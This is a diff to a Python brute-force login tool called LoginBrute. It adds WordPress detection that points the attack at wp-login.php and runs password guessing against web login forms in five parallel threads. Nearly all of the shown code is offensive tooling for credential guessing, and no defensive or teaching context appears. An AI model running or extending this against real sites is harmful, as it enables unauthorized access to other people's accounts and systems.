@@ -1,14 +1,36 @@
 import argparse
+from sqlite3 import Time
+import threading
+from time import time
 import attack
-
+from Wappalyzer import Wappalyzer, WebPage
 
 class LoginBrute:
+
+    def get_admin_page(self, url):
+        webpage = WebPage.new_from_url(url)
+        wappalyzer = Wappalyzer.latest()
+        if 'WordPress' in wappalyzer.analyze(webpage):
+            if 'wp-login.php' not in url:
+                url += '/wp-login.php' 
+        return url
 
     def __init__(self, ):
         print("#########################################\n\n")
         params = self.get_parameters(self.get_args())
-        attack.brute(params)
+        pass_list_len = len(params['password_list'])
+        passwords = params['password_list']
 
+        if pass_list_len < 5:
+            for i in range(len(params['password_list'])):
+                threading.Thread(target=attack.brute, args=(params, (passwords[i].strip(), )), daemon=True).start()
+        else:
+            chunks = [params['password_list'][i:i+int(pass_list_len/5)] for i in range(0, pass_list_len, int(pass_list_len/5))]
+            for i in range(5):
+                threading.Thread(target=attack.brute, args=(params, chunks[i]), daemon=True).start()
+        while not attack.success:
+            pass
+    
     def get_args(self):
         parser = argparse.ArgumentParser()
 
@@ -30,17 +52,18 @@ class LoginBrute:
         password, pass_list = args.password, args.passList
         data, url, fail_text = args.data, args.url, args.failTxt
 
+        url = self.get_admin_page(url)
         if pass_list:
             try:
                 pass_list = open(pass_list, encoding="utf-8").readlines()
             except IOError as e:
-                print('File' + pass_list + ' not found')
+                print('File ' + pass_list + ' not found')
 
         if user_list:
             try:
                 user_list = open(user_list, encoding="utf-8").readlines()
             except IOError as e:
-                print('File' + user_list + 'not found')
+                print('File ' + user_list + ' not found')
 
         if not user_list and not username:
             username = 'test'
@@ -65,7 +88,7 @@ class LoginBrute:
                 i = method.rfind('=') + 1
                 method = method[i:len(method)]
             except IOError as e:
-                print(self.error + 'invalid html parameters input\n')
+                print(self.error + ' invalid html parameters input\n')
                 exit(1)
         else:
             import params_scraper
@@ -97,6 +120,5 @@ class LoginBrute:
             'fail_text': fail_text,
             'action': action
         }
-
 
 LoginBrute()
